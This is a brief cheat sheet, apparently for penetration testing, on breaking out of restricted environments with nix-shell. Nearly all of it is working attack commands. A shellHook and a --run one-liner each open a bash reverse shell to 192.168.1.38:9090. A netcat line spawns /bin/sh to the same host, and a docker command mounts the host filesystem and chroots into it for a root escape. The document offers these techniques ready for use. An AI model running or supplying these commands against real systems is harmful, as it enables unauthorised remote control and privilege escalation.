# nixos-breakouts

https://nixos.org/

Some options with 'nix-shell' in restricted environments.


*Execute CMD*

```
0f084cc1ea88:/# cat hooks.nix 
# hooks.nix
with (import <nixpkgs> {});
mkShell {
  shellHook = ''
     bash -i >& /dev/tcp/192.168.1.38/9090 0>&1    
  '';
}

0f084cc1ea88:/# nix-shell hooks.nix 

```

*Alternative Execute CMD*

```
nix-shell -p --run "bash -i >& /dev/tcp/192.168.1.38/9090 0>&1"

```

*Download (Package) & Execute*

```
nix-shell -p netcat --run "nc 192.168.1.38 9090 -c -e /bin/sh"

```
Packages available:

https://search.nixos.org/packages

e.g.

```
nix-shell -p docker --run "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"

```
